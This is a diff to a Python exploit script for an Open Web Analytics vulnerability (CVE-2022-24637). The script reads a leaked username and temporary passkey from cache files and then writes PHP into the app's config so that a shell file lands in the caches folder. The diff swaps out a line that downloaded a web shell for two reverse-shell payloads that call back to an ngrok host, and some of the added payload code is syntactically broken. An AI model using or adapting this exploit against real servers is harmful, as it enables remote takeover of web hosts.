@@ -6,8 +6,12 @@ import base64
 import json
 import re
 import sys
+from rich.console import Console
 
-#CVE_2022_24637
+console =Console()
+
+
+#CVE_2022_246_37
 #Author: ys jhonson le wana
 #facebook :https://www.facebook.com/jhlk.lua'
 #Email:wannaajhonson@gmail.com
@@ -34,10 +38,12 @@ for key in range(100):
   	user = r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"'
   	re1 = re.search(user, decode).group(1)
   	
+  	blue1 = '[bold yellow]' +'[INFO]'
+  	console.print(blue1, f'nom d\'utulisateur : {re1}')
   	
   	password =  r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"'
   	re2 = re.search(password, decode).group(1)
-  	print('Votre mot de pass temporaire est : ' +re2)
+  	console.print(blue1, 'Votre mot de pass temporaire est : ' +f'{re2}')
   	
   	#hash
   	
@@ -74,13 +80,18 @@ for key in range(100):
   	cookie = session.cookies.get_dict()
   	
   	
-  	shell = 'vxx.txt'
+  	shell = 'sm.php'
   	log_location = "/var/www/html/owa/owa-data/caches/" + shell
   	
   	xx = requests.get(config , cookies=cookie)
   	regex = r'owa_nonce" value="(\w*)"'
   	rec = re.search(regex, xx.text).group(1)
   	nonce = rec
+  	
+  	
+  	
+  	console.print(blue1, f'id_site :{nonce}')
+  	
   	
   	
   	
@@ -96,21 +107,27 @@ for key in range(100):
   	
   	
   	
-  	reverse = f'<?php file_put_contents("{shell}", file_get_contents("https://raw.githubusercontent.com/Chocapikk/Shells/main/pwny.php")); ?>'
+  
   	
+  	jon = '<?php system("bash -i >& /dev/tcp/0.tcp.in ngrok.io/17440 0>&1");?>'
   	
+  	payload = '<?php $sock=fsockopen("0.tcp.in.ngrok.io",17740;$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'
+
   	
   	
   	data4 = {
       "owa_nonce": nonce,
       "owa_action": "base.optionsUpdate", 
-      "owa_config[shell]": 'jo'
+      "owa_config[shell]": payload
    }
   	
   	
   	sad = requests.post(config, data=data4, cookies=cookie)
   	cd = str(sad.url)
-  	print('\033[92m'+base_url+"/owa-data/caches/" + shell+ ' '+ 'Succes [+]')
+  	base= base_url+"owa-data/caches/" + shell
+  	car = '\033[92m' + '[success]'
+  	
+  	print(car, f'Url du shell : {base}')
   	
   	
   		
